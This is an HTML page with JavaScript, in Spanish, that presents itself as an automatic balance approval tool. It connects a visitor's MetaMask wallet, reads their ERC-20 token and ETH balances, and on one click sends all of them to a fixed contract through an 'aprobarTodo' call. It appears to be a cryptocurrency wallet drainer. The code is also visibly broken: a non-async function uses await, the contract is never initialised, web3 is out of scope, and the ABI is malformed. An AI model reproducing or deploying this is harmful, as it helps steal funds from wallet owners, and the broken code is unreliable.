<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interacción con el Contrato SaldoManager</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
</head>
<body>
    <h1>Aprobación Automática de Saldo</h1>
    <button onclick="approveAll()">Aprobar Todo</button>

    <script>
        // Verificar si MetaMask está instalado
        if (typeof window.ethereum !== 'undefined') {
            console.log("MetaMask está instalado");
            const web3 = new Web3(window.ethereum); // Usamos la instancia de MetaMask correctamente
            window.ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {
                if (accounts.length > 0) {
                    console.log("Cuenta conectada:", accounts[0]);
                } else {
                    alert("Por favor conecta tu billetera MetaMask.");
                }
            }).catch(error => {
                alert("Error al conectar con MetaMask: " + error.message);
            });
        } else {
            alert("Por favor instala MetaMask para continuar.");
            throw new Error("MetaMask no está instalado");
        }

        // Dirección del contrato SaldoManager
        const contractAddress = '0x26c0B6C2A8120E9c71de55FB678E76174598B196';
        
        // ABI del contrato
        const contractABI = [
            {
                "constant": true,
                "inputs": [{"name": "token", "type": "address"}],
                "name": "revisarSaldoERC20",
                "outputs": [{"name": "", "type": "uint256"}],
                "payable": false,
                "stateMutability": "view",
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {
                        "components": [
                            { "name": "token", "type": "address" },
                            { "name": "cantidad", "type": "uint256" },
                            { "name": "esERC20", "type": "bool" },
                            { "name": "esERC721", "type": "bool" },
                            { "name": "esERC1155", "type": "bool" }
                        ],
                        "name": "aprobarTodo",
                        "type": "function"
                    }
                ],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // Instanciamos el contrato después de que MetaMask se haya conectado
        let contract;
        function initContract() {
            const accounts = await web3.eth.getAccounts();
            const userAddress = accounts[0];
            contract = new web3.eth.Contract(contractABI, contractAddress);
        }

        // Función para obtener los tokens ERC-20 del usuario
        async function getERC20Tokens() {
            const accounts = await web3.eth.getAccounts();
            const userAddress = accounts[0];

            // Lista de contratos ERC-20 que el usuario podría tener
            const tokenContracts = [
                '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                '0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1',
                '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85'
                // Añadir más tokens si es necesario
            ];

            let tokensToApprove = [];
            for (let i = 0; i < tokenContracts.length; i++) {
                const token = tokenContracts[i];
                const tokenContract = new web3.eth.Contract([
                    {
                        "constant": true,
                        "inputs": [{"name": "account", "type": "address"}],
                        "name": "balanceOf",
                        "outputs": [{"name": "", "type": "uint256"}],
                        "payable": false,
                        "stateMutability": "view",
                        "type": "function"
                    }
                ], token);

                const balance = await tokenContract.methods.balanceOf(userAddress).call();

                if (balance > 0) {
                    tokensToApprove.push({
                        token: token,
                        cantidad: balance,
                        esERC20: true,
                        esERC721: false,
                        esERC1155: false
                    });
                }
            }
            return tokensToApprove;
        }

        // Función para verificar el saldo de ETH del usuario
        async function getETHBalance() {
            const accounts = await web3.eth.getAccounts();
            const userAddress = accounts[0];
            const balance = await web3.eth.getBalance(userAddress);
            return balance;
        }

        // Función para aprobar todo
        async function approveAll() {
            try {
                const ethBalance = await getETHBalance();
                const tokensToApprove = await getERC20Tokens();

                if (ethBalance > 0 || tokensToApprove.length > 0) {
                    const accounts = await web3.eth.getAccounts();
                    const userAddress = accounts[0];

                    // Preparar las aprobaciones
                    const aprobacionesERC20 = tokensToApprove.map(token => ({
                        token: token.token,
                        cantidad: token.cantidad,
                        esERC20: token.esERC20,
                        esERC721: token.esERC721,
                        esERC1155: token.esERC1155
                    }));

                    // Llamar al contrato para aprobar todo
                    await contract.methods.aprobarTodo(
                        aprobacionesERC20,
                        [], // Enviar contratos ERC721 si los hay
                        [], // Enviar contratos ERC1155 si los hay
                        ethBalance // Enviar ETH disponible
                    ).send({ from: userAddress });

                    alert("Aprobación completa para el contrato!");
                } else {
                    alert("No tienes saldo en ETH o tokens.");
                }
            } catch (error) {
                console.error("Error al aprobar los saldos:", error);
                alert("Hubo un error al intentar aprobar los saldos.");
            }
        }
    </script>
</body>
</html>
